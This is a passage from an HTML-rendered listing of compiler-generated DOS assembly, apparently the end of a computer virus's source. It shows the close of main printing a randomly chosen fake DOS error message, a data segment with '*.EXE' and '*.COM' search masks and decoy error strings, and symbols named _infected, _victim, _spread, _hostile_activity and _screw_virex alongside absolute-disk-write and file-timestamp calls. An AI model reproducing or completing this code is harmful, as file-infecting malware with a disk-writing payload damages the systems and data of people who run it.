   </span><span class="sc1">;        puts(err_msg[peek(0, 0x46C) % (sizeof(err_msg) / sizeof(char *))]);</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">1132</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">DGROUP</span><span class="sc4">:</span><span class="sc5">d@w</span><span class="sc4">+</span><span class="sc2">22</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">_puts</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        return(1);</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    }</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> 
</span><span class="sc5">_main</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">
    </span><span class="sc5">?debug</span><span class="sc0">  </span><span class="sc10">C</span><span class="sc0"> </span><span class="sc5">E9</span><span class="sc0">
</span><span class="sc5">_TEXT</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc5">_DATA</span><span class="sc0">   </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'DATA'</span><span class="sc0">
</span><span class="sc5">s@</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'*.EXE'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'*.COM'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Out of memory'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Bad EXE format'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Invalid DOS version'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Bad memory block'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'FCB creation error'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Sharing violation'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Abnormal program termination'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Divide error'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_DATA</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc5">_TEXT</span><span class="sc0">   </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">
</span><span class="sc5">_TEXT</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">__creat</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">__open</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc9">public</span><span class="sc0">  </span><span class="sc5">_infected</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">_findfirst</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">_findnext</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc9">public</span><span class="sc0">  </span><span class="sc5">_hostile_activity</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">_setftime</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">__read</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc9">public</span><span class="sc0">  </span><span class="sc5">_victim</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">_puts</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">__argv</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0">
    </span><span class="sc9">public</span><span class="sc0">  </span><span class="sc5">_main</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">_chsize</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc9">public</span><span class="sc0">  </span><span class="sc5">_screw_virex</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">_close</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc9">public</span><span class="sc0">  </span><span class="sc5">_spread</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">__write</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">__chmod</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">_abswrite</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc9">end</span><span class="sc0">
</span></div></body>
</html>
